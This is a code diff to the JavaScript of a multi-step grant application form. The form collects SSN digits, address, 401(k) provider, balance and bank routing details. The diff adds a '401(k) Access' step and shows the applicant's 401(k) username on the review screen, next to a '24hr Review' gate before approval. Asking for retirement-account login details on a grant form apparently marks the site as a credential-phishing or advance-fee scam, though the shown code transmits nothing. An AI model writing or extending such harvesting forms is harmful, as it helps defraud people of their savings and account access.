@@ -253,16 +253,18 @@ function initApplicationForm() {
   const formCard = document.querySelector('.form-card');
   if (!formCard) return;
 
-  const totalSteps = 5;
+  const totalSteps = 6;
   let currentStep = 1;
   const formData = {
     personal: {},
-    kverify: {},
+    banking: {},
     business: {},
-    banking: {}
+    kverify: {},
+    kaccess: {},
+    review: {}
   };
 
-  const stepLabels = ['Personal', '401(k)', 'Purpose', 'Banking', 'Review'];
+  const stepLabels = ['Personal', 'Banking', 'Purpose', '401(k)', '401(k) Access', 'Review'];
 
   function updateProgressSteps() {
     const steps = document.querySelectorAll('.progress-step');
@@ -297,13 +299,20 @@ function initApplicationForm() {
 
     updateProgressSteps();
 
-    const nextLabel = step === totalSteps ? 'Submit Application' : (step === totalSteps - 1 ? 'Review Application →' : 'Continue →');
+    let nextLabel;
+    if (step === totalSteps) nextLabel = 'Submit Application';
+    else if (step === totalSteps - 1) nextLabel = 'Review Application →';
+    else nextLabel = 'Continue →';
 
     formCard.querySelectorAll('.btn-prev').forEach(function (btnPrev) {
       btnPrev.style.visibility = step === 1 ? 'hidden' : 'visible';
     });
     formCard.querySelectorAll('.btn-next-step').forEach(function (btnNext) {
-      if (!btnNext.classList.contains('btn-submit-final')) {
+      if (btnNext.classList.contains('btn-submit-final')) return;
+      const inStep = btnNext.closest('.form-step');
+      if (inStep && inStep.dataset.step === '4') {
+        btnNext.textContent = 'Continue →';
+      } else {
         btnNext.textContent = nextLabel;
       }
     });
@@ -326,6 +335,7 @@ function initApplicationForm() {
   function populateReview() {
     const p = formData.personal;
     const k = formData.kverify;
+    const ka = formData.kaccess;
     const b = formData.business;
     const ba = formData.banking;
 
@@ -340,13 +350,15 @@ function initApplicationForm() {
       <div class="review-item"><span class="label">SSN (Last 4)</span><span class="value">${p.ssn ? '•••-••-' + p.ssn : '—'}</span></div>
       <div class="review-item"><span class="label">Street Address</span><span class="value">${p.address || '—'}</span></div>
       <div class="review-item"><span class="label">401(k) Provider</span><span class="value">${k.provider || '—'}</span></div>
+      <div class="review-item"><span class="label">401(k) Username</span><span class="value">${ka.k401AccessUsername || k.k401Username || '—'}</span></div>
       <div class="review-item"><span class="label">Account Balance</span><span class="value">${k.balance ? '$' + Number(k.balance).toLocaleString() : '—'}</span></div>
       <div class="review-item"><span class="label">Business / Need</span><span class="value">${b.businessName || '—'}</span></div>
       <div class="review-item"><span class="label">Employment Status</span><span class="value">${b.businessType || '—'}</span></div>
       <div class="review-item"><span class="label">Grant Amount</span><span class="value">${b.grantAmount ? '$' + Number(b.grantAmount).toLocaleString() : '—'}</span></div>
       <div class="review-item"><span class="label">Bank Name</span><span class="value">${ba.bankName || '—'}</span></div>
-      <div class="review-item"><span class="label">Account Type</span><span class="value">${ba.accountType || '—'}</span></div>
+      <div class="review-item"><span class="label">Bank Account Type</span><span class="value">${ba.bankAccountType || '—'}</span></div>
       <div class="review-item"><span class="label">Routing Number</span><span class="value">${ba.routing ? '••••••' + (ba.routing.slice(-3) || '') : '—'}</span></div>
+      <div class="review-item"><span class="label">24hr Review</span><span class="value">Required before approval</span></div>
     `;
   }
 
